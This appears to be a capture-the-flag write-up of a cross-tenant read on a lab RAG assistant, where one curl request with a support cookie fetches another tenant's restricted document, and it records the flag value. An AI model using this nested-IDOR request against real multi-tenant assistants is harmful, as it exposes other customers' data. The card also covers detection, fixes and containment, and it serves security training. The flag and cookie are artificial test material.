# K23.3 — A missing tenant boundary

> **Category:** 2. KeplerOps · **Points:** 100 · **Difficulty:** medium
> **Solved by:** pi lane K23

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Cross-tenant object read on a RAG document route — the request validates the context/conversation pair but never the document's tenant |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET https://assistant.keplerops.test/api/contexts/ctx-rill-support-v3/conversations/CONV-RILL-442-8/documents/DOC-RILL-442` |
| **Prerequisite** | K23.1's inventory (ids), K23.2's conversation binding (`TEN-RILL-022`), `fieldkest_support` cookie |
| **Flag** | accepted, value not recorded |

**What you are about to read:** the payoff of the K23 chain — reading Rillhaven's restricted document
(`RILL-442.md`) out of an assistant that was supposed to keep tenants apart.

## Objective

> Use the exposed context and conversation evidence to recover another customer's restricted support
> document.

With the open inventory and the overlay cookie, the route is one request away.

## Background you need

**RAG stores are shared.** One vector index holds every tenant's chunks with tenancy as a query-time
filter. If a route can fetch "document X in context Y" where the context belongs to tenant A and the
document to tenant B, the only barrier is a filter the route may not apply.

**Chunks are stored whole** for citation (`sources[].text`), so one lookup returns the full document,
and document ids are stable (`DOC-<tenant-hint>-<number>`): the id announces the tenant and still the
route does not compare it with the caller's scope.

**Nested resources.** Three segments: context, conversation, document. Validating the first two and
trusting the third is the archetypal nested-IDOR, and here the first two belong together.

## Walkthrough

### 1. Assemble the three ids

```
context       ctx-rill-support-v3   (tenant TEN-RILL-022, workspace rill-support)
conversation  CONV-RILL-442-8       (tenant TEN-RILL-022)
document      DOC-RILL-442          (Rillhaven asset RILL-PUMP-442)
```

`DOC-RILL-442` is *also* listed in the ARWC context (`ctx-support-private-v4`): one document, two
contexts, two tenants — a missing boundary, not one bad id.

### 2. Establish the session and fetch the document

```bash
C="Cookie: fieldkest_support=fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b"

curl -sS -H "$C" --max-time 90 \
  'https://assistant.keplerops.test/api/contexts/ctx-rill-support-v3/conversations/CONV-RILL-442-8/documents/DOC-RILL-442' \
  | jq '.sources[0]'
```

Two practical notes: the route is slow — **30–45 s** (42 s for the ARWC-context variant), so a default
timeout fails intermittently; and the response is a `sources[]` array with text at `sources[0].text`.

### 3. Read what came back

`sources[0].text` is the full restricted `RILL-442.md`:

```
Customer:  Rillhaven   tenant TEN-RILL-022   Asset: RILL-PUMP-442
Connector: FLK-7.4.1-RILL   Diagnostic: DIAG-RILL-MIX-08
Document token: <the flag>
```

Another customer's support document, reached from a context the ARWC case can address.

### 4. Getting the flag

The document token in `sources[0].text` is the flag. Lane notes record it as
`FLAG{4a4620cd59307eb7}` with the submission accepted; the card stores no value.

## Why this works (the vulnerability explained)

Authorisation was applied to **reachability**, not **content**:

```
route check:  context + conversation exist and belong together      -> pass
route check:  caller holds a support overlay session                -> pass
route check:  document.tenant == conversation.tenant == caller.tenant -> absent
```

The result is a cross-tenant read structurally identical to a nested IDOR, with one twist: the leaked
object is a *chunk of a shared vector index*, so the attacker never reaches the customer's database.
The RAG layer had already copied the document into a namespace both tenants can resolve.

Three lessons: the index is a copy, so it needs its own ACL — tenant filters must be enforced on
*every* retrieval route, not just the chat path; parent validation is not child authorisation; and
citations return full text by design, so `sources[].text` must be redacted when the caller lacks the
document's tenant or classification.

## Detection and fix

- **Log signal:** document reads where `document.tenant != context.tenant`; one cookie reading across
  tenants; the same document under two contexts (the ingest-time alarm that should have fired).
- **Fix:** enforce tenant and classification at the document route against the document's metadata,
  not the URL; filter `sources[].text` by caller role; make the vector query take a mandatory tenant
  predicate; keep per-tenant namespaces for regulated customers.
- **Containment:** re-index (a document in the wrong namespace is a data-protection incident either
  way) and audit who read `DOC-RILL-442` from the ARWC context (K21.3).

## Notes and dead ends

- Recorded facts: the route, `sources[0].text`, the contents (Rillhaven, `TEN-RILL-022`,
  `RILL-PUMP-442`, `FLK-7.4.1-RILL`, `DIAG-RILL-MIX-08`, token), the 30–45 s latency, and the same
  document being listed in `ctx-support-private-v4`.
- Cross-context variant: `ctx-support-private-v4/CONV-SUP-2841-19/DOC-RILL-442` returns the *ARWC*
  escalation material in 42 s — the document id in the URL does not decide the response. That is
  K21.3's finding, not this card's.
- `CONV-RILL-442-8` (K23.2) and `CONV-SUP-2841-19` (K21.2) both read with the same cookie; the only
  guard is knowing the ids — which K23.1 hands out unauthenticated.
